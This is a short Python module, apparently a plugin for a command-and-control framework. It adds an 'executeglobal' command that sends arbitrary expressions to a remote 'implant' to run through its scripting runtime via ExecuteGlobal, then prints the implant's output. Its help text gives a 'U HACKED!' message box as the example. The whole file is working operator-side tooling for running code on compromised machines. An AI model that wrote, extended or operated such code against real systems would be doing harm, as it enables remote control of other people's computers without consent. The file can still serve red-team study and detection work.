from features import addFeature
import messages
from messages import OutgoingMessage

class ExecuteGlobalCommand():
  command = 'executeglobal'

  def run(arguments, implant):
    if not implant:
      print('use implant first!')
    else:
      message = OutgoingMessage(ExecuteGlobalCommand.command, bytes(' '.join(arguments), 'ascii'))
      implant.queueOutgoingMessage(message)

  def help():
    return 'Evaluate expressions in the implant\'s native language runtime using ExecuteGlobal. Usage: executeglobal Msgbox("U HACKED!")'

  def incoming(data, implant):
    try:
      data = str(data, 'utf-8') 
      print(data, end = '\n', flush=True)
    except:
      print('Received unencodable executeglobal data from ' + implant.name + ': ' + data.hex())

addFeature(ExecuteGlobalCommand)
